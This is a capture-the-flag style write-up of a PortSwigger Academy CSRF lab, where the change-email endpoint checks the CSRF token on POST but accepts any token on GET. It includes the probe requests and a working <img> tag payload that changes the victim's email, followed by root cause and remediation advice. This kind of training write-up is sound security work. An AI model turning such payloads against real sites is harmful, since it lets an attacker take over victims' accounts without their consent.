# LAB 02 - CSRF where token validation depends on request method

## Lab Information

- **Category:** Cross-Site Request Forgery (CSRF)
- **Type:** CSRF Token
- **Difficulty:** PRACTITIONER
- **Status:** ✅ Solved
- **Date:** 2026-9-3

---

![Cross-Site Request Forgery](https://img.shields.io/badge/Cross_Site_Request_Forgery-CSRF-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

# Table of Contents

- Executive Summary
- Lab Information
- Objective
- Vulnerability Overview
- Attack Prerequisites
- Environment & Scope
- Methodology
- Discovery Process
- Technical Analysis
- Payload Analysis
- Exploitation Flow
- Evidence
- Impact
- Root Cause
- Risk Assessment
- Remediation
- Lessons Learned
- References
- Screenshots

---

# Executive Summary

A Cross-Site Request Forgery (CSRF) vulnerability was identified in the email-change functionality. The application requires a CSRF parameter for both request methods, but CSRF token validation is implemented inconsistently. While the token is properly validated for POST requests, a GET request accepts an arbitrary CSRF token value.

This allows an attacker to construct a cross-site GET request that changes the authenticated victim's email address without requiring the valid CSRF token associated with the victim's session.

---

# Objective

The objective of this lab is to demonstrate that an attacker can cause a state-changing request to be submitted from an external origin while the victim is authenticated to the target application.

---

# Vulnerability Overview

A Cross-Site Request Forgery (CSRF) vulnerability occurs when an attacker tricks the browser of a logged in victim into sending a request to another website, causing that site to execute the request using the victim's privileges.
Authentication establishes who the user is, but it does not necessarily prove that the user intentionally initiated a particular request.

---


# Attack Requirements

1- The victim is logged into the target site.
2- The victim's browser automatically includes the authentication credentials required by the target application.
3- The attacker knows or can guess the target URL and the required transaction parameters.
4- The sensitive action can be triggered via various elements, such as a form, an image, an embedded frame, or a link.
5- Ensure that CSRF token protection is correctly implemented for the POST method only.
6- The application does not implement another effective CSRF defense.

---

# Environment & Scope

| Item | Value |
|------|-------|
| Target | PortSwigger Web Security Academy lab |
| Endpoint | `/my-account/change-email` |
| HTTP Method | POST |
| Parameter | `email` |
| Authentication | Session cookie |
| CSRF Protection | CSRF Token |
| Attack Platform | Exploit Server |
| Client | Web Browser |
| Attack Vector | Cross-site HTML form submission |

---

# Methodology

1. Open the vulnerable lab.
2. Enter a valid email address to update it.
3. Inspect the HTTP request and response using Burp Suite.
4. Check the request to see if it contains protection values.
5. Go to the exploit page.
6. Create an <img> element whose `src` attribute contains the vulnerable endpoint, the attacker-controlled email address, and an arbitrary CSRF token value.
7. Placing an attacker-controlled email address and a default CSRF token within the `src` attribute.
8. Automatically submit the form from the exploit server.
9. Deliver the exploit to the victim.
10. Verify that the victim's email address was changed.

---

# Discovery Process

### Step 1 — Testing the Update email

```email
mohamad@gmail.com
```

The email address is updated via the `email` parameter, and the browser uses session data to identify the user, with CSRF token protection in place.

### Step 2 — Change the method from post to get

```text
GET /my-account/change-email HTTP/1.1
HOST:XXXXXXXX
Cookie: session=REDACTED
email= mohamad@gmail.com & csrf= XXXXXX
```
In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'email'"
In other words, the 'email' parameter is required.

### Step 3 — Testing the email parameter without csrf

```text
GET/my-account/change-email?email= mohamad@gmail.com/HTTP/1.1
HOST:XXXXXXXX
Cookie Session: XXXXXXX

```

In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'csrf'"
In other words, the 'csrf' parameter is required.

### Step 3 — Testing an invalid csrf value

```text
GET/my-account/change-email?email= mohamad@gmail.com & csrf= invalid/HTTP/1.1
HOST:XXXXXXXX
Cookie Session: XXXXXXX

```
In the response, we will observe A "302 Found" response appeared without any error message, indicating that the server requests the CSRF token during a GET request but fails to validate it correctly and therein lies the vulnerability.

---

## Security Control Verification

| Request Method | CSRF Parameter | Token Value | Result |
|---|---|---|---|
| POST | Present | Valid | ✅ Email changed |
| GET | Present | Valid | ✅ Email changed |
| GET | Missing | N/A | ❌ Request rejected |
| GET | Present | Invalid | ✅ Email changed |

The final test demonstrates the vulnerability: the GET request requires the `csrf` parameter to exist but does not properly validate its value.

---

# Technical Analysis

The vulnerable functionality uses the following endpoint:

```http
POST /my-account/change-email

email= mohamad@gmail.com & csrf= XXXXXX
```
The relevant request parameter is: email=mohamad@gmail.com
The request is authenticated using the victim's session cookie.

The request includes a CSRF token, but it is not properly validated for the GET method.

Therefore, the application accepts the state-changing request based on the authenticated session without verifying that the request was intentionally initiated by the legitimate application.

```http
GET /my-account/change-email?email= mohamad@gmail.com & csrf= invalid HTTP/2
Host: TARGET
Cookie: session=[REDACTED]
Content-Type: application/x-www-form-urlencoded

```

---

# Payload Analysis

## Payload Used

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">
```

## Why This Payload Works

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">

```
When the victim's browser loads the attacker's page, the `<img>` element causes the browser to issue a GET request to the vulnerable endpoint. If the target session cookie is included according to the browser's cookie policy, the request is authenticated as the victim.

Because the GET handler does not properly validate the CSRF token, the attacker can supply an arbitrary token value and cause the email address to be changed.

---

# Exploitation Flow

```text
Attacker
   │
   ▼
Exploit Server
   │
   │ malicious HTML
   ▼
Victim Browser
   │
   │ automatic GET
   │ + victim session
   ▼
Target Server
   │
   │ GET + invalid CSRF
   ▼
Email changed
  
```

---

# Impact

Depending on the privileges of the victim and the application's functionality, successful CSRF exploitation may allow an attacker to:

- Change the victim's email address.
- Modify account profile information.
- Perform unauthorized account actions.
- Change security-related settings if they are vulnerable to CSRF.
- Perform administrative actions when the victim has administrative privileges.
- Trigger financial or transactional operations if those endpoints lack CSRF protection.
  
### Lab-Specific Impact

In this lab, successful exploitation allows an attacker to change the authenticated victim's email address without the victim intentionally submitting the request.

Depending on the application's account recovery and security mechanisms, unauthorized email modification may potentially contribute to account takeover.

---

# Root Cause

The root cause is inconsistent CSRF token validation based on the HTTP request method.

The application requires a CSRF parameter for the GET request, but it fails to properly validate whether the supplied token is valid. As a result, an attacker can provide an arbitrary value for the `csrf` parameter and still trigger the state-changing email update operation.

For example:

```http
GET /my-account/change-email?email=attacker@gmail.com&csrf=invalid
```
The server accepts the request and changes the authenticated user's email address.
This occurs because the security control is implemented inconsistently across HTTP request methods.

---

# Risk Assessment

| Item | Value |
|------|-------|
| Severity |  Medium |
| CVSS Score | Not calculated |
| CWE | CWE-352: Cross-Site Request Forgery (CSRF) |
| OWASP Category | Cross-Site Request Forgery (CSRF) |
| Exploitability | Demonstrated in lab |
| Business Impact | Unauthorized account/email modification; potential account takeover depending on account recovery functionality |

---

# Remediation

- **Using Anti-CSRF Tokens**
  - Generate a random, unique, and cryptographically secure token for each user session or request.
  - Include this token in operations that alter data state (such as POST, PUT, and DELETE requests).
  - The server verifies that the token received from the browser matches the stored token before executing the request.

- - **SameSite Cookies**
  - Configure session cookies with an appropriate `SameSite` policy such as `Lax` or `Strict` where compatible with the application's requirements.
  - SameSite should be considered an additional layer of defense rather than the sole CSRF protection mechanism.
    
- **Request for re-authentication for sensitive actions**
  - Requiring the user to enter their current password, a two-factor authentication (2FA/OTP) code, or solve a CAPTCHA before completing critical      actions (such as changing their email address, transferring funds, or deleting their account).

- **Strict adherence to REST standards (Strict HTTP Methods)**
  - Ensure that GET requests are used solely for viewing and reading data, and never alter the system state (changing a password via a GET link is     a security disaster).

- **Validating Custom Request Headers**
  - When using technologies like AJAX or Fetch (in SPA applications), Use custom request headers for AJAX/API requests where appropriate, combined     with a server-side validation strategy and CORS enforcement. A custom header should not be treated as the sole CSRF defense.
  - Browsers prevent external sites from automatically sending custom headers due to the CORS policy.
 
  - **Checking Origin and Referer Headers**
  - Verifying the Origin or Referer header on the server side as an additional validation step to ensure that the request actually originated from     your site rather than a malicious one.
    
---

# Lessons Learned

- Browsers may automatically attach authentication cookies to requests, subject to cookie policies such as SameSite.
- Predictability and ease of exploitation.
- Risks associated with state-changing HTTP requests.
- Simulating the attack via independent interfaces.
- Authentication is not equivalent to intent verification.
- CSRF exploits the victim's authenticated session rather than stealing the session itself.
- A state-changing request should require an appropriate CSRF defense.
- The CSRF protection token must be applied to all methods.
  
---

# References

- OWASP
- PortSwigger Web Security Academy
- MITRE CWE
- CVSS Specification

---

# Screenshots

## Test

![Test](Screen-Shots/test-lab2.png)

...

## Burp Request

![Test](Screen-Shots/burp-request-lab2.png)

...

## Payload

![Test](Screen-Shots/payload-lab2.png)

...


## Successful 

![Success](Screen-Shots/success-lab2.png)

---

# Conclusion

This practical experiment demonstrated the successful exploitation of a Cross-Site Request Forgery (CSRF) vulnerability in a lab environment.

The vulnerable endpoint accepted a state-changing GET request containing an invalid CSRF token. Although the application required the `csrf` parameter to be present, it failed to properly validate its value when the request used the GET method.

By embedding the malicious GET request within an `<img>` element hosted on the exploit server, the attacker was able to cause the victim's browser to submit the request using the victim's authenticated session, resulting in an unauthorized email change.

The key lesson is that CSRF protection must be applied consistently and validated correctly for every HTTP method capable of performing state-changing operations.

The key takeaway is that authentication alone is insufficient to verify user intent. CSRF tokens must be implemented across all methods, appropriate SameSite cookie policies applied, and Origin/Referer headers validated where applicable.
